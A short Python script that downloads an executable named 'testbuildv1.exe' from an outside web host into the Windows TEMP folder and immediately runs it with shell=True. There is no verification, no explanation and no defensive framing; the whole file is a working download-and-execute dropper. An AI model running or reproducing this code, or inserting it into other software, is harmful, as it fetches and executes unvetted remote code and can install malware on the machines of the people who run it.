import os
import subprocess
import urllib.request

url = "http://leonboussen.com/subfolder/testbuildv1.exe"
local_path = os.path.join(os.getenv("TEMP"), "testbuildv1.exe")

try:
    urllib.request.urlretrieve(url, local_path)
    subprocess.run([local_path], shell=True, check=True)
except Exception as e:
    print(f"An error occurred: {e}")
